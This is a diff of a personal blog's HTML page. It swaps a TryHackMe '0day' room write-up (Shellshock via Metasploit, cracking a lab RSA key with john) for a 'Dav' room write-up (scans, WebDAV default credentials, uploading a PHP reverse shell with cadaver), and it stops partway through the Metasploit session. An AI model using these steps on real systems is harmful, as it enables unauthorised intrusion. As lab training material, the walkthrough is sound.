@@ -5,7 +5,7 @@
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>TryHackMe Writeup - 0day Room – g4nd1v</title>
+    <title>TryHackMe Writeup - Dav Room – g4nd1v</title>
     
 
 
@@ -653,7 +653,7 @@
     
     var baseurl = JSON.parse("\"https://g4nd1v.github.io\"");
     
-    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/tryhackme-0day/\"");
+    var permalink = JSON.parse("\"https://g4nd1v.github.io/posts/tryhackme-dav/\"");
     
     var langprefix = JSON.parse("\"\"");
     var searchResults = null;
@@ -1331,32 +1331,32 @@
 
 
     
-<meta name="description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags." />
+<meta name="description" content="boot2root machine for FIT and bsides guatemala CTF" />
 
 
-<meta name="keywords" content="TryHackMe,Shellshock,HashCracking">
+<meta name="keywords" content="TryHackMe,Apache,Webdav">
 
-<meta name="created" content="2024-02-16T00:00:00&#43;0000">
-<meta name="modified" content="2024-02-16T00:00:00&#43;0000">
-<meta property="article:published_time" content="2024-02-16T00:00:00&#43;0000">
+<meta name="created" content="2024-02-22T00:00:00&#43;0000">
+<meta name="modified" content="2024-02-22T00:00:00&#43;0000">
+<meta property="article:published_time" content="2024-02-22T00:00:00&#43;0000">
 
 <meta name="author" content="g4nd1v">
-<meta property="article:author" content="https://g4nd1v.github.io/posts/tryhackme-0day/@g4nd1v">
+<meta property="article:author" content="https://g4nd1v.github.io/posts/tryhackme-dav/@g4nd1v">
 
 
 <meta property="og:site_name" content="g4nd1v">
-<meta property="og:title" content="TryHackMe Writeup - 0day Room">
-<meta property="og:url" content="https://g4nd1v.github.io/posts/tryhackme-0day/">
+<meta property="og:title" content="TryHackMe Writeup - Dav Room">
+<meta property="og:url" content="https://g4nd1v.github.io/posts/tryhackme-dav/">
 <meta property="og:type" content="article">
-<meta property="og:description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.">
+<meta property="og:description" content="boot2root machine for FIT and bsides guatemala CTF">
 
   
-    <meta property="og:image" content="https://g4nd1v.github.io/images/0day/banner.jpeg">
-    <meta property="og:image:url" content="https://g4nd1v.github.io/images/0day/banner.jpeg">
+    <meta property="og:image" content="https://g4nd1v.github.io/images/Dav/banner.jpeg">
+    <meta property="og:image:url" content="https://g4nd1v.github.io/images/Dav/banner.jpeg">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:app:name:iphone" content="g4nd1v">
-    <meta property="twitter:title" content="TryHackMe Writeup - 0day Room">
-    <meta property="twitter:description" content="Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.">
+    <meta property="twitter:title" content="TryHackMe Writeup - Dav Room">
+    <meta property="twitter:description" content="boot2root machine for FIT and bsides guatemala CTF">
   
 
 <meta name="generator" content="Hugo 0.112.0">
@@ -1368,7 +1368,7 @@
 
 <meta name="apple-mobile-web-app-status-bar-style" content="#fff">
 
-<link rel="canonical" href="https://g4nd1v.github.io/posts/tryhackme-0day/">
+<link rel="canonical" href="https://g4nd1v.github.io/posts/tryhackme-dav/">
 
 <link rel="manifest" href="/manifest.json">
 
@@ -1382,13 +1382,13 @@
   {
     "@context": "https://schema.org",
     "@type": "WebPage",
-    "headline": "TryHackMe Writeup - 0day Room",
-    "datePublished": "2024-02-16T00:00:00Z",
-    "dateModified": "2024-02-16T00:00:00Z",
-    "url" : "https://g4nd1v.github.io/posts/tryhackme-0day/",
-    "description": "Detailed walkthrough of the 0day room on TryHackMe platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.",
-    "keywords": ["TryHackMe","Shellshock","HashCracking"],
-    "image" : "https://g4nd1v.github.io/images/0day/banner.jpeg",
+    "headline": "TryHackMe Writeup - Dav Room",
+    "datePublished": "2024-02-22T00:00:00Z",
+    "dateModified": "2024-02-22T00:00:00Z",
+    "url" : "https://g4nd1v.github.io/posts/tryhackme-dav/",
+    "description": "boot2root machine for FIT and bsides guatemala CTF",
+    "keywords": ["TryHackMe","Apache","Webdav"],
+    "image" : "https://g4nd1v.github.io/images/Dav/banner.jpeg",
     "author": {
       "@type": "Person",
       "name": "g4nd1v"
@@ -1639,7 +1639,7 @@
   
   <li  class="is-active" >
     
-      <span>TryHackMe Writeup - 0day Room</span>
+      <span>TryHackMe Writeup - Dav Room</span>
     
   </li>
   
@@ -1651,14 +1651,14 @@
   <div class="single ">
     <div class="single__nojs">This page looks best with JavaScript enabled</div>
     <script>document.querySelector('.single').classList.remove('hide'); document.querySelector('.single__nojs').classList.add('hide');</script>
-    <h2 class="single__title" data-ani="true">TryHackMe Writeup - 0day Room</h2>
+    <h2 class="single__title" data-ani="true">TryHackMe Writeup - Dav Room</h2>
     <h3 class="single__subtitle"></h3>
     <div class="single__meta">
       
 <div class="single__infos">
-  <time class="single__info" title="Written At">📅&nbsp;Feb 16, 2024 </time>
+  <time class="single__info" title="Written At">📅&nbsp;Feb 22, 2024 </time>
   
-  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;6&nbsp;min read </span>
+  &nbsp;&middot;&nbsp; <span class="single__info" title="Reading Time"> ☕&nbsp;3&nbsp;min read </span>
   
   &nbsp;&middot;&nbsp; <span class="single__info" title="WRITTEN BY">👨‍💻&nbsp;g4nd1v</span>
   
@@ -1675,9 +1675,9 @@
 
   <li><a href="https://g4nd1v.github.io/tags/tryhackme/" class="single__tag" title="TryHackMe">#TryHackMe</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/shellshock/" class="single__tag" title="Shellshock">#Shellshock</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/apache/" class="single__tag" title="Apache">#Apache</a></li>
 
-  <li><a href="https://g4nd1v.github.io/tags/hashcracking/" class="single__tag" title="HashCracking">#HashCracking</a></li>
+  <li><a href="https://g4nd1v.github.io/tags/webdav/" class="single__tag" title="Webdav">#Webdav</a></li>
 
 </ul>
 
@@ -1694,38 +1694,38 @@
   <div class="expand__content expand__content--toc">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#foothold">Foothold</a></li>
-    <li><a href="#user-flag">user flag</a></li>
-    <li><a href="#root-flag">root flag</a></li>
+    <li><a href="#nmap">Nmap</a></li>
+    <li><a href="#user-flag">User flag</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
   </ul>
 </nav>
   </div>
 </div>
 
-      <h1 id="0day">0day</h1>
+      <h1 id="title">Title</h1>
 <table>
 <thead>
 <tr>
 <th>Title</th>
-<th><a href="https://tryhackme.com/room/0day">0day</a></th>
+<th><a href="https://tryhackme.com/room/bsidesgtdav">https://tryhackme.com/room/bsidesgtdav</a></th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Description</td>
-<td>Exploit Ubuntu, like a Turtle in a Hurricane</td>
+<td>boot2root machine for FIT and bsides guatemala CTF</td>
 </tr>
 <tr>
 <td>Difficulty</td>
-<td>Medium</td>
+<td>Easy</td>
 </tr>
 <tr>
 <td>Maker</td>
-<td><a href="https://tryhackme.com/p/0day">0day</a></td>
+<td><a href="https://tryhackme.com/p/stuxnet">https://tryhackme.com/p/stuxnet</a></td>
 </tr>
 </tbody>
 </table>
-<h2 id="foothold">Foothold</h2>
+<h2 id="nmap">Nmap</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1741,107 +1741,23 @@
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">1024</span> 5720823c62aa8f4223c0b893996f499c <span class="o">(</span>DSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4c40db32640d110cef4fb85b739bc76b <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> f76f78d58352a64dda213c5547b72d6d <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> a5b4f084b6a78deb0a9d3e7437336516 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: 0day
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ nmap -sC -sV -oA nmap/dav 10.10.88.48
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-02-22 18:51 EST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.88.48
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">999</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>From nmap, we didn&rsquo;t find anything interesting, therefore let&rsquo;s find the directories.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $gobuster dir -u 0day.thm -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://0day.thm
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Timeout:                 10s
-===============================================================
-2023/06/12 15:51:58 Starting gobuster in directory enumeration mode
-===============================================================
-/cgi-bin              (Status: 301) [Size: 305] [--&gt; http://0day.thm/cgi-bin/]
-/img                  (Status: 301) [Size: 301] [--&gt; http://0day.thm/img/]
-/uploads              (Status: 301) [Size: 305] [--&gt; http://0day.thm/uploads/]
-/admin                (Status: 301) [Size: 303] [--&gt; http://0day.thm/admin/]
-/css                  (Status: 301) [Size: 301] [--&gt; http://0day.thm/css/]
-/js                   (Status: 301) [Size: 300] [--&gt; http://0day.thm/js/]
-/backup               (Status: 301) [Size: 304] [--&gt; http://0day.thm/backup/]
-/secret               (Status: 301) [Size: 304] [--&gt; http://0day.thm/secret/]
-...
-/cgi-bin              (Status: 301) [Size: 305] [--&gt; http://0day.thm/cgi-bin/]
-...
-</code></pre><p>We get private RSA from <code>/backup</code>, let&rsquo;s crack it using <code>john</code>.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">-----BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547
-
-T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx
-H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM
-FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS
-Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8
-9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO
-IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN
-SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g
-/5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt
-w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB
-6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u
-Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl
-xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6
-8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii
-b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn
-vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL
-wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG
-rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW
-RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6
-oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk
-cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE
-99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq
-Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q
-Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h
-v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst
-gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P
------END RSA PRIVATE KEY-----
-</code></pre><pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $python2 /usr/share/john/ssh2john.py ./rsa_private_key &gt; rsa.hash
-
-└──╼ $john --wordlist=/usr/share/wordlists/rockyou.txt ./rsa.hash
-...
-letmein          (./rsa_private_key)
-</code></pre><p>Then I tried to login with ssh, but I can&rsquo;t. <strong>Damm it! It&rsquo;s a rabbit hole</strong>.</p>
-<p>I am clueless now, maybe Nikto scan can help.</p>
-<pre tabindex="0"><code class="language-shell!" data-lang="shell!">└──╼ $nikto -h 0day.thm
-- Nikto v2.1.5
----------------------------------------------------------------------------
-+ Target IP:          10.10.152.56
-+ Target Hostname:    0day.thm
-+ Target Port:        80
-+ Start Time:         2023-06-12 16:08:31 (GMT5.5)
----------------------------------------------------------------------------
-+ Server: Apache/2.4.7 (Ubuntu)
-+ Server leaks inodes via ETags, header found with file /, fields: 0xbd1 0x5ae57bb9a1192
-+ The anti-clickjacking X-Frame-Options header is not present.
-+ &#34;robots.txt&#34; retrieved but it does not contain any &#39;disallow&#39; entries (which is odd).
-+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST
-
-+ OSVDB-3092: /admin/: This might be interesting...
-+ OSVDB-3092: /backup/: This might be interesting...
-+ OSVDB-3268: /img/: Directory indexing found.
-+ OSVDB-3092: /img/: This might be interesting...
-+ OSVDB-3092: /secret/: This might be interesting...
-+ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
-...
-</code></pre><p>We have checked other files, but this <code>test.cgi</code> is new, after checking that endpoint, in a response it said <code>Hello World!</code>, huh, weird.</p>
-<p>After searching on <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi">Hacktricks</a> I tried to test it using nmap.</p>
+</div><p>So basically only one port is open, that is <code>80</code> .</p>
+<p>Also, on this port there is a default page of apache2.</p>
+<p><img src="images/Dav/Untitled.png" alt="Untitled" /></p>
+<p>Next logical step will be to search for directories.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1865,36 +1781,63 @@ letmein          (./rsa_private_key)
 </span><span class="lnt">19
 </span><span class="lnt">20
 </span><span class="lnt">21
-</span><span class="lnt">22
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">└──╼ <span class="nv">$nmap</span> 0day.thm -p <span class="m">80</span> --script<span class="o">=</span>http-shellshock --script-args <span class="nv">uri</span><span class="o">=</span>/cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl">Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-06-12 16:21 IST
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 0day.thm <span class="o">(</span>10.10.152.56<span class="o">)</span>
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.18s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
-</span></span><span class="line"><span class="cl">80/tcp open  http
-</span></span><span class="line"><span class="cl"><span class="p">|</span> http-shellshock:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   VULNERABLE:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTP Shellshock vulnerability
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     IDs:  CVE:CVE-2014-6271
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       This web application might be affected by the vulnerability known
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       as Shellshock. It seems the server is executing commands injected
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       via malicious HTTP headers.
-</span></span><span class="line"><span class="cl"><span class="p">|</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     Disclosure date: 2014-09-24
-</span></span><span class="line"><span class="cl"><span class="p">|</span>     References:
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://seclists.org/oss-sec/2014/q3/685
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271
-</span></span><span class="line"><span class="cl"><span class="p">|</span>       http://www.openwall.com/lists/oss-security/2014/09/24/10
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_      https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-7169
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ gobuster dir -u 10.10.88.48 -w /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Gobuster v3.6
+</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.88.48
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.6
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration <span class="nv">mode</span>
+</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
+</span></span><span class="line"><span class="cl">/.hta                 <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 290<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htaccess            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/.htpasswd            <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 295<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 11321<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 299<span class="o">]</span>
+</span></span><span class="line"><span class="cl">/webdav               <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 458<span class="o">]</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now, we metasploit exploit to get the shell.</p>
-<h2 id="user-flag">user flag</h2>
-<p>using <code>metasploit</code> we can shell.</p>
+</div><p>We found a directory named as <code>/webdav</code> but it is asking for username and password.</p>
+<p><img src="images/Dav/Untitled%201.png" alt="Untitled" /></p>
+<p>After searching through internet about webdav, I found default credentials - <a href="https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html">https://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html</a></p>
+<p>user: <code>wampp</code><br />
+pass: <code>xampp</code></p>
+<h2 id="user-flag">User flag</h2>
+<p>I found a file <a href="http://10.10.88.48/webdav/passwd.dav"><code>passwd.dav</code></a> on server and in that file, I found this credentials<br />
+<code>wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91</code> but I cannot be able to crack it.</p>
+<p>I found a blog which is about exploiting webdav - <a href="https://vk9-sec.com/exploiting-webdav/">https://vk9-sec.com/exploiting-webdav/</a> and uploading the rev shell using php.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">└─$ cadaver http://10.10.188.137/webdav
+</span></span><span class="line"><span class="cl">Authentication required <span class="k">for</span> webdav on server <span class="sb">`</span>10.10.188.137<span class="s1">&#39;:
+</span></span></span><span class="line"><span class="cl"><span class="s1">Username: wampp
+</span></span></span><span class="line"><span class="cl"><span class="s1">Password:
+</span></span></span><span class="line"><span class="cl"><span class="s1">dav:/webdav/&gt; ls
+</span></span></span><span class="line"><span class="cl"><span class="s1">Listing collection `/webdav/&#39;</span>: succeeded.
+</span></span><span class="line"><span class="cl">        passwd.dav                            <span class="m">44</span>  Aug <span class="m">25</span>  <span class="m">2019</span>
+</span></span><span class="line"><span class="cl">dav:/webdav/&gt; put php-reverse-shell.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On visiting the website, we got the shell!!</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1908,267 +1851,57 @@ letmein          (./rsa_private_key)
 </span><span class="lnt"> 9
 </span><span class="lnt">10
 </span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; search shellshock
-</span></span><span class="line"><span class="cl">   <span class="c1">#   Name                                               Disclosure Date  Rank       Check  Description</span>
-</span></span><span class="line"><span class="cl">   -   ----                                               ---------------  ----       -----  -----------
-</span></span><span class="line"><span class="cl">   <span class="m">0</span>   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection <span class="o">(</span>Shellshock<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   <span class="m">1</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span class="o">(</span>Shellshock<span class="o">)</span>
-</span></span><span class="line"><span class="cl">   <span class="m">2</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span class="o">(</span>Shellshock<span class="o">)</span> Scanner
-</span></span><span class="line"><span class="cl">... results ...
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> &gt;&gt; use <span class="m">1</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> rhosts 0day.thm
-</span></span><span class="line"><span class="cl"><span class="nv">rhosts</span> <span class="o">=</span>&gt; 0day.thm
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; <span class="nb">set</span> targeturi /cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl"><span class="nv">targeturi</span> <span class="o">=</span>&gt; /cgi-bin/test.cgi
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="o">[</span>msf<span class="o">](</span>Jobs:0 Agents:0<span class="o">)</span> exploit<span class="o">(</span>multi/http/apache_mod_cgi_bash_env_exec<span class="o">)</span> &gt;&gt; show payloads
